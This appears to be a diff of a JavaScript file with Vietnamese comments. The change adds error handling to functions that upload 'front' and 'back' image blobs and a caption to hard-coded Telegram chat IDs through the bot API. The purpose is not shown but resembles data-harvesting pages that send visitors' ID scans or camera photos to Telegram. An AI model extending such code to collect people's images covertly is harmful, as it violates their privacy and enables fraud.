@@ -151,6 +151,11 @@ function getCaption() {
 `.trim();
 }
 
+// 👇 Hàm phụ này chưa có trong bản gốc, nên bạn cần có nó
+function getCaptionWithExtras() {
+  return getCaption();
+}
+
 async function sendPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
@@ -161,18 +166,32 @@ async function sendPhotos(frontBlob, backBlob) {
   formData.append('front', frontBlob, 'front.jpg');
   formData.append('back', backBlob, 'back.jpg');
 
-  return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
+  try {
+    const res = await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
+    const json = await res.json();
+    if (!json.ok) console.error("❌ Lỗi gửi ảnh:", json);
+    else console.log("✅ Gửi ảnh thành công:", json);
+  } catch (err) {
+    console.error("❌ Gửi ảnh thất bại:", err);
+  }
 }
 
 async function sendTextOnly() {
-  return fetch(API_SEND_TEXT, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
-      text: getCaption()
-    })
-  });
+  try {
+    const res = await fetch(API_SEND_TEXT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
+        text: getCaption()
+      })
+    });
+    const json = await res.json();
+    if (!json.ok) console.error("❌ Lỗi gửi tin nhắn:", json);
+    else console.log("✅ Gửi tin nhắn thành công:", json);
+  } catch (err) {
+    console.error("❌ Gửi tin nhắn thất bại:", err);
+  }
 }
 
 function delay(ms) {
